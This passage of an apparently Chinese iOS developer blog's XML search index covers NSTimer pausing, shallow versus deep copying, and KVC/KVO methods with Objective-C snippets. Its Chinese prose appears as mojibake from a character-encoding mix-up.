è®¾ç½®å®šæ—¶å™¨ä»Žå½“å‰æ—¶é—´ä¹‹åŽä¸¤ç§’æ‰å¼€å§‹æ‰§è¡Œ [self.timer setFireDate:[NSDate dateWithTimeIntervalSinceNow:2.0]]; å…³é—­å®šæ—¶å™¨(é”€æ¯) è¿™ç§çš„æ€§èƒ½ä¸å¥½ æ¯æ¬¡éƒ½è¦é‡å¯ 1[self.timer invalidate]; æš‚åœå®šæ—¶å™¨(å¯ä»¥é‡‡ç”¨è¿™ç§) 123 // è®¾ç½®timerçš„å¼€å§‹æ—¶é—´ä¸º é¥è¿œçš„æœªæ¥ 4001// NSLog(@"%@", [NSDate distantFuture]); [self.timer setFireDate:[NSDate distantFuture]]; å°è£…çš„æ€æƒ³ åªè¦å‘çŽ°æŽ§åˆ¶å™¨çŸ¥é“å¾—å¤ªå¤š,å°±è¦è€ƒè™‘é‡æž„ä»£ç  åªè¦å‘çŽ°ä¸€ä¸ªæ•ˆæžœå¾ˆå¤šåœ°æ–¹éƒ½éœ€è¦ä½¿ç”¨, å°±è¦è€ƒè™‘å°è£…]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>UIScrollView</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹å…³äºŽæµ…æ‹·è´å’Œæ·±æ‹·è´]]></title>
    <url>%2Farchives%2Fa1e080e.html</url>
    <content type="text"><![CDATA[æ·±æ‹·è´å’Œæµ…æ‹·è´æ˜¯ä»¥æ˜¯å¦äº§ç”Ÿæ–°å¯¹è±¡ä¸ºä¾æ®çš„,ä¸æ˜¯ä»¥æ‹·è´äº§ç”Ÿçš„å‰¯æœ¬ç±»åž‹ä¸ºä¾æ®çš„ã€‚ æ‹·è´ å®žçŽ°æ‹·è´çš„æ–¹æ³•æœ‰2ä¸ª copyï¼šè¿”å›žä¸å¯å˜å‰¯æœ¬ mutableCopyï¼šè¿”å›žå¯å˜å‰¯æœ¬ æ™®é€šå¯¹è±¡å®žçŽ°æ‹·è´çš„æ­¥éª¤ éµå®ˆNSCopyingåè®® å®žçŽ°-copyWithZone:æ–¹æ³• åˆ›å»ºæ–°å¯¹è±¡ ç»™æ–°å¯¹è±¡çš„å±žæ€§èµ‹å€¼ copyè¯­æ³•ç›®çš„ï¼šæ”¹å˜å‰¯æœ¬çš„æ—¶å€™ ä¸ä¼šæ”¹å˜æºå¯¹è±¡ã€‚ æ·±æ‹·è´å’Œæµ…æ‹·è´ æ·±æ‹·è´ (mutableCopy)æ˜¯å†…å®¹æ‹·è´ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„å¯¹è±¡ æ–°å¯¹è±¡çš„è®¡æ•°å™¨ä¸º1ï¼Œæºå¯¹è±¡ä¸ä¼šæ”¹å˜ æµ…æ‹·è´ (copy) æŒ‡é’ˆæ‹·è´ ä¸ä¼šäº§ç”Ÿæ–°çš„å¯¹è±¡ æºå¯¹è±¡çš„è®¡æ•°å™¨+1 copyäº§ç”Ÿçš„æ˜¯ä¸å¯å˜å‰¯æœ¬ ç”±äºŽæºå¯¹è±¡æœ¬èº«å°±ä¸å¯å˜ä¸ºäº†æ€§èƒ½ç€æƒ³ï¼Œcopyä¼šç›´æŽ¥è¿”å›žæºå¯¹è±¡æœ¬èº« ä¸å¯å˜å¯¹è±¡è°ƒç”¨æ‹·è´ æµ…æ‹·è´ä¸å¯å˜ æ·±æ‹·è´å¯å˜ å¯å˜å¯¹è±¡ è°ƒç”¨æ‹·è´ éƒ½æ˜¯æ·±æ‹·è´ æ‰€ä»¥åªæœ‰ä¸€ç§æƒ…å†µæ˜¯æµ…æ‹·è´: ä¸å¯å˜å¯¹è±¡è°ƒç”¨copyæ–¹æ³•æ—¶ åœ¨æµ…æ‹·è´çš„æƒ…å†µä¸‹ copyå°±ç›¸å½“äºŽretain æ³¨æ„æ·±æ‹·è´å’Œæµ…æ‹·è´æ˜¯ä»¥æ˜¯å¦äº§ç”Ÿæ–°å¯¹è±¡ä¸ºä¸€å±€çš„,ä¸æ˜¯ä»¥æ‹·è´äº§ç”Ÿçš„å‰¯æœ¬ç±»åž‹ä¸ºä¾æ®çš„ã€‚]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>copy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹KVOå’ŒKVCå¸¸ç”¨æ–¹æ³•]]></title>
    <url>%2Farchives%2F5a324ffa.html</url>
    <content type="text"><![CDATA[KVCå¯ä»¥é€šè¿‡Keyç›´æŽ¥è®¿é—®å¯¹è±¡çš„å±žæ€§ï¼Œæˆ–è€…ç»™å¯¹è±¡çš„å±žæ€§èµ‹å€¼ã€‚è€Œä¸éœ€è¦è°ƒç”¨æ˜Žç¡®çš„å­˜å–æ–¹æ³•ã€‚è¿™æ ·å°±å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è®¿é—®å’Œä¿®æ”¹å¯¹è±¡çš„å±žæ€§ã€è€Œä¸æ˜¯åœ¨ç¼–è¯‘æ—¶ç¡®å®šã€‚KVOåˆ™æ˜¯å¯¹ç›®æ ‡å¯¹è±¡çš„æŸå±žæ€§æ·»åŠ è§‚å¯Ÿï¼Œå½“è¯¥å±žæ€§å‘ç”Ÿå˜åŒ–æ—¶ï¼Œé€šè¿‡è§¦å‘è§‚å¯Ÿè€…å¯¹è±¡å®žçŽ°çš„KVOæŽ¥å£æ–¹æ³•ï¼Œæ¥è‡ªåŠ¨çš„é€šçŸ¥è§‚å¯Ÿè€…ã€‚ KVC å…¨ç§°ï¼šKey Value Codingï¼ˆé”®å€¼ç¼–ç ï¼‰ æœ¬è´¨ : é€šè¿‡setæ–¹æ³•ä¿®æ”¹æˆå‘˜å˜é‡å±žæ€§çš„å€¼(å’Œè°ƒç”¨setæ–¹æ³•ä¿®æ”¹å€¼æ˜¯ä¸€æ ·çš„) è€Œä¸”å¯ä»¥ä¿®æ”¹ç§æœ‰æˆå‘˜å˜é‡çš„å€¼(åŒ…æ‹¬ç³»ç»Ÿçš„ç§æœ‰æˆå‘˜å˜é‡) è€Œä¸”ä¼šè‡ªåŠ¨è½¬æ¢ç±»åž‹(åªç”¨äºŽç®€å•çš„è½¬æ¢) èµ‹å€¼ 1234// èƒ½ä¿®æ”¹ç§æœ‰æˆå‘˜å˜é‡- (void)setValue:(id)value forKey:(NSString *)key;- (void)setValue:(id)value forKeyPath:(NSString *)keyPath;- (void)setValuesForKeysWithDictionary:(NSDictionary *)keyedValues; å–å€¼ 1234// èƒ½å–å¾—ç§æœ‰æˆå‘˜å˜é‡çš„å€¼- (id)valueForKey:(NSString *)key;- (id)valueForKeyPath:(NSString *)keyPath;- (NSDictionary *)dictionaryWithValuesForKeys:(NSArray *)keys; ç§æœ‰å±žæ€§èµ‹å€¼ åˆ©ç”¨KVCç»™UIPageControlè®¾ç½®é¡µç å›¾ç‰‡ 12[pageControl setValue:[UIImage imageNamed:@"current"] forKeyPath:@"_currentPageImage"];[pageControl setValue:[UIImage imageNamed:@"other"] forKeyPath:@"_pageImage"]; æ¯”è¾ƒå®žç”¨çš„æ–¹æ³•123456789101112131415161718 XSBook *book1 = [[XSBook alloc] init]; book1.name = @"5åˆ†é’Ÿçªç ´iOSå¼€å‘"; book1.price = 10.7; XSBook *book2 = [[XSBook alloc] init]; book2.name = @"4åˆ†é’Ÿçªç ´iOSå¼€å‘"; book2.price = 109.7; XSBook *book3 = [[XSBook alloc] init]; book3.name = @"1åˆ†é’Ÿçªç ´iOSå¼€å‘"; book3.price = 1580.7; p.books = @[book1, book2, book3]; // å¦‚æžœvalueForKeyPath:æ–¹æ³•çš„è°ƒç”¨è€…æ˜¯æ•°ç»„ï¼Œé‚£ä¹ˆå°±æ˜¯åŽ»è®¿é—®æ•°ç»„å…ƒç´ çš„å±žæ€§å€¼ // å–å¾—booksæ•°ç»„ä¸­æ‰€æœ‰XSBookå¯¹è±¡çš„nameå±žæ€§å€¼ï¼Œæ”¾åœ¨ä¸€ä¸ªæ–°çš„æ•°ç»„ä¸­è¿”å›ž// NSArray *names = [p valueForKeyPath:@"books.name"];// NSArray *names = [p.books valueForKeyPath:@"name"]; ä¸å¸¸ç”¨çš„æ–¹æ³•123456789// è®¡ç®—æ•°é‡NSLog(@"%@", [p.books valueForKeyPath:@"@count"]);NSLog(@"%@", [p valueForKeyPath:@"books.@count"]);// è®¡ç®—é‡Œé¢æœ€å¤§å€¼NSLog(@"%@", [p.books valueForKeyPath:@"@max.price"]);// è®¡ç®—é‡Œé¢æœ€å°å€¼NSLog(@"%@", [p.books valueForKeyPath:@"@min.price"]);// è®¡ç®—é‡Œé¢å¹³å‡å€¼NSLog(@"%@", [p.books valueForKeyPath:@"@avg.price"]); KVO å…¨ç§°ï¼šKey Value Observingï¼ˆé”®å€¼ç›‘å¬ï¼‰ ä½œç”¨ï¼šç›‘å¬æ¨¡åž‹çš„å±žæ€§å€¼æ”¹å˜ æ­¥éª¤ æ·»åŠ ç›‘å¬å™¨ 12345// ä¸ºå¯¹è±¡pæ·»åŠ ä¸€ä¸ªè§‚å¯Ÿè€…ï¼ˆç›‘å¬å™¨ï¼‰// Observerï¼šè§‚å¯Ÿè€…ï¼ˆç›‘å¬å™¨ï¼‰// KeyPathï¼šå±žæ€§åï¼ˆéœ€è¦ç›‘å¬å“ªä¸ªå±žæ€§ï¼‰// åˆ©ç”¨bå¯¹è±¡æ¥ç›‘å¬aå¯¹è±¡nameå±žæ€§çš„æ”¹å˜[a addObserver:b forKeyPath:@"name" options:NSKeyValueObservingOptionOld | NSKeyValueObservingOptionNew context:@"test"]; åœ¨ç›‘å¬å™¨ä¸­å®žçŽ°ç›‘å¬æ–¹æ³• 123456789101112/** * å½“åˆ©ç”¨KVOç›‘å¬åˆ°æŸä¸ªå¯¹è±¡çš„å±žæ€§å€¼å‘ç”Ÿäº†æ”¹å˜ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ª * * @param keyPath å“ªä¸ªå±žæ€§è¢«æ”¹äº† * @param object å“ªä¸ªå¯¹è±¡çš„å±žæ€§è¢«æ”¹äº† * @param change æ”¹æˆå’‹æ · * @param context å½“åˆaddObserveræ—¶çš„contextå‚æ•°å€¼ */-(void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)context&#123; NSLog(@"%@ %@ %@ %@", object, keyPath, change, context);&#125;]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>KVC</tag>
        <tag>KVO</tag>
      </tags>
  </entry>
</search>
